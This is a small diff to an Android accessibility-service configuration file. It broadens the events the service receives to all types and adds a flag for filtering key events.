@@ -1,8 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-    android:accessibilityEventTypes="typeViewTextChanged|typeWindowContentChanged"
-    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews"
-    android:accessibilityFeedbackType=""
+    android:accessibilityEventTypes="typeAllMask"
+    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagRequestFilterKeyEvents"
     android:notificationTimeout="10"
     android:canRetrieveWindowContent="true"/>
-    <!--"typeViewTextChanged|typeViewTextSelectionChanged"-->
+    <!--"typeViewTextChanged|typeWindowContentChanged"-->
